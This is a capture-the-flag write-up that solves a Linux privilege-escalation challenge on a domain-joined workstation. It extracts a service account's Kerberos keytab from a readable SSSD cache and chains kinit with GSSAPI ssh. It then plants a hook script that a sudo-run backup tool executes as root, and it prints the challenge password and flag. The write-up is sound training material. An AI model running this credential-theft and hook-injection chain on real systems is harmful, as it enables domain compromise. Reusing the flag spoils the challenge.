---
title: patient-one
category: linux
difficulty: insane
points: 100-500
author: Ch1Hub
date: 2026-11-09
---
# Patient One — Complete Official Writeup
**Category:** Linux / Privilege Escalation / Kerberos Internals  
**Difficulty:** Insane  
**Flag:** `ingehack{K3rb3r0s_SSSD_LDB_GSS4P1_R0ut1n3_1nj3ct10n_h0w_3duc4t1v3_w4s_th4t_!}`

---

## 1. Context & Objective

In **Part 1**, we analyzed network forensics from the breach of **`ESI-SBA`** (`ESI-SBA.DZ`) and identified initial access via ScreenConnect setup bypass, resulting in the compromise of **`Prof. A. AMRANE`** (`ESISBA\a.amrane`).

In **Part 2**, we are given initial SSH access to Prof. AMRANE's Linux domain-joined workstation (`WORKSTATION-SBA-AMRANE`):
```bash
ssh -p 2222 a.amrane@<HOST>
# Password: Amrane#SBA2026
```
Our objective is to escalate privileges to `root` and retrieve `/flag`.

---

## 2. Step 1: Enumeration & Situational Awareness

Upon logging in as `a.amrane`, we check our user ID and groups:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ id
uid=10001(a.amrane) gid=10001(sba-faculty) groups=10001(sba-faculty)
```

Checking scheduled tasks and cron jobs:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ cat /etc/cron.d/esi_sba_backup
0 * * * * svc_ad_sync /usr/local/bin/sba-backup --run
```
A dedicated service account named `svc_ad_sync` executes `/usr/local/bin/sba-backup --run` hourly.

Checking sudo permissions for `a.amrane`:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ sudo -l
[sudo] password for a.amrane:
Sorry, user a.amrane may not run sudo on WORKSTATION-SBA-AMRANE.
```

Checking `/etc/sudoers.d/`:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ ls -l /etc/sudoers.d/
-r--r----- 1 root root 87 Nov  8 21:00 esi_sba
```
We cannot read `/etc/sudoers.d/esi_sba` directly as `a.amrane`.

---

## 3. Step 2: Investigating SSSD Cache Database

We check domain configuration files to understand how the workstation is integrated into `ESI-SBA.DZ`:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ cat /etc/krb5.conf
[libdefaults]
    default_realm = ESI-SBA.DZ
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 1s
    renew_lifetime = 2s
...
```

On Linux systems joined to an Active Directory domain via SSSD (*System Security Services Daemon*), cached domain objects, user attributes, and keytabs are stored in Samba LDB format under `/var/lib/sss/db/`.

Checking `/var/lib/sss/db/`:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ ls -ld /var/lib/sss/db
drwxr-x--- 2 root sba-faculty 4096 Nov  8 21:00 /var/lib/sss/db

a.amrane@WORKSTATION-SBA-AMRANE:~$ ls -la /var/lib/sss/db/
-rw-rw---- 1 root sba-faculty 1286144 Nov  8 21:00 cache_ESI-SBA.DZ.ldb
```

The database `cache_ESI-SBA.DZ.ldb` is group-readable by `sba-faculty`. We can query it using `ldbsearch`:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ ldbsearch -H /var/lib/sss/db/cache_ESI-SBA.DZ.ldb "(name=svc_ad_sync)"
# record 1
dn: cn=svc_ad_sync,cn=users,cn=ESI-SBA.DZ,cn=sysdb
gecos: ESI-SBA Directory Sync Service
gidNumber: 10002
homeDirectory: /home/svc_ad_sync
loginShell: /bin/bash
name: svc_ad_sync
objectClass: user
sAMAccountName: svc_ad_sync
uidNumber: 10002
userKeytab:: BQIAAABMAAEACkVTSS1TQkEuRFoAC3N2Y19hZF9zeW5jAAAAAWrw/tgCABIAIO/DR
 k9FIvGuNbdGfJYzAuteDXGF44qxA9hYaBbTD8MeAAAAAgAAADwAAQAKRVNJLVNCQS5EWgALc3ZjX2
 FkX3N5bmMAAAABavD+2AIAEQAQoTlArWx0OFaVZQoxCWwCwgAAAAI=
userPrincipalName: svc_ad_sync@ESI-SBA.DZ
distinguishedName: cn=svc_ad_sync,cn=users,cn=ESI-SBA.DZ,cn=sysdb
```

The `userKeytab` attribute contains the base64-encoded Kerberos keytab for `svc_ad_sync@ESI-SBA.DZ`!

---

## 4. Step 3: Keytab Extraction & Kerberos Time Anomaly

Because LDIF standard folds long base64 lines by prefixing continued lines with a leading space, we unfold the string and decode it into a keytab binary:

```bash
ldbsearch -H /var/lib/sss/db/cache_ESI-SBA.DZ.ldb '(sAMAccountName=svc_ad_sync)' userKeytab | \
  awk '/^userKeytab::/{flag=1; sub(/^userKeytab:: */, ""); printf "%s", $0; next} flag && /^ /{sub(/^ /, ""); printf "%s", $0; next} flag && !/^ /{flag=0}' | \
  base64 -d > /tmp/svc.keytab
```

We verify the keytab using `klist`:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ klist -k /tmp/svc.keytab
Keytab name: FILE:/tmp/svc.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 svc_ad_sync@ESI-SBA.DZ
   2 svc_ad_sync@ESI-SBA.DZ
```

Now we inspect `/etc/krb5.conf` to understand realm parameters:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ cat /etc/krb5.conf
[libdefaults]
    default_realm = ESI-SBA.DZ
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 1s
    renew_lifetime = 2s
...
```
> [!CRITICAL]
> **Ticket Lifetime is configured to 1 second (`ticket_lifetime = 1s`).**  
> Under RFC 4120, Kerberos tickets have sub-second precision truncated to 1 second. If we run `kinit`, the ticket expires almost instantly (within 1000ms).

Testing interactive acquisition:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ kinit -k -t /tmp/svc.keytab svc_ad_sync@ESI-SBA.DZ
a.amrane@WORKSTATION-SBA-AMRANE:~$ klist
Ticket cache: FILE:/tmp/krb5cc_10001
Default principal: svc_ad_sync@ESI-SBA.DZ

Valid starting     Expires            Service principal
11/08/26 23:01:10  11/08/26 23:01:11  krbtgt/ESI-SBA.DZ@ESI-SBA.DZ
```
Trying to run `ssh svc_ad_sync@localhost` manually after inspecting the ticket fails because the ticket is already expired (`klist: Ticket expired`).

---

## 5. Step 4: Chaining the One-Liner (GSSAPI Authentication)

SSHD is configured with GSSAPI Single Sign-On:
- `GSSAPIAuthentication yes`
- `GSSAPIKeyExchange yes`

With OpenSSH, `-K` enables GSSAPI credential delegation / authentication.  
To bypass the 1-second expiration barrier, we must chain `kinit` directly with the SSH execution in a single command pipeline:

```bash
kinit -k -t /tmp/svc.keytab svc_ad_sync@ESI-SBA.DZ && ssh -o StrictHostKeyChecking=no -K svc_ad_sync@localhost "id"
```

Output:
```
uid=10002(svc_ad_sync) gid=10002(svc_ad_sync) groups=10002(svc_ad_sync)
```
We now possess remote code execution under the `svc_ad_sync` service account.

---

## 6. Step 5: Privilege Escalation via Sudo Backup Hook

As `svc_ad_sync`, we check our sudo permissions:
```bash
kinit -k -t /tmp/svc.keytab svc_ad_sync@ESI-SBA.DZ && ssh -o StrictHostKeyChecking=no -K svc_ad_sync@localhost "sudo -l"
```
Output:
```
Matching Defaults entries for svc_ad_sync on WORKSTATION-SBA-AMRANE:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User svc_ad_sync may run the following commands on WORKSTATION-SBA-AMRANE:
    (root) NOPASSWD: /usr/local/bin/sba-backup --run
```

Now let's inspect the backup script `/usr/local/bin/sba-backup`:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ cat /usr/local/bin/sba-backup
...
# Hook execution routine
HOOK_DIR="/opt/esi-sba/hooks"
if [ -d "$HOOK_DIR" ]; then
    for hook in "$HOOK_DIR"/*.sh; do
        if [ -x "$hook" ]; then
            echo "[*] Executing pre-synchronization hook: $(basename "$hook")..."
            "$hook"
        fi
    done
fi
...
```

Checking directory permissions for `/opt/esi-sba/hooks`:
```bash
a.amrane@WORKSTATION-SBA-AMRANE:~$ ls -ld /opt/esi-sba/hooks
drwxrwxr-x 2 svc_ad_sync svc_ad_sync 4096 Nov  8 21:00 /opt/esi-sba/hooks
```
`/opt/esi-sba/hooks` is writable by `svc_ad_sync`. When `/usr/local/bin/sba-backup` is executed via `sudo` as `root`, it iterates over all executable `*.sh` scripts inside this directory and executes them as `root`.

---

## 7. Step 6: Full Exploit & Flag Capture

We plant our payload script `/opt/esi-sba/hooks/privesc.sh` and execute the backup script:

```bash
kinit -k -t /tmp/svc.keytab svc_ad_sync@ESI-SBA.DZ && ssh -o StrictHostKeyChecking=no -K svc_ad_sync@localhost '
cat << "HOOK" > /opt/esi-sba/hooks/privesc.sh
#!/bin/bash
cat /flag
HOOK
chmod +x /opt/esi-sba/hooks/privesc.sh
sudo /usr/local/bin/sba-backup --run
'
```

Output:
```
[*] Initializing ESI-SBA Faculty Backup Procedure...
[*] Executing pre-synchronization hook: privesc.sh...
ingehack{K3rb3r0s_SSSD_LDB_GSS4P1_R0ut1n3_1nj3ct10n_h0w_3duc4t1v3_w4s_th4t_!}
[*] Verifying remote storage connectivity...
[+] Synchronization cycle completed successfully.
```

**Flag:**
```
ingehack{K3rb3r0s_SSSD_LDB_GSS4P1_R0ut1n3_1nj3ct10n_h0w_3duc4t1v3_w4s_th4t_!}
```
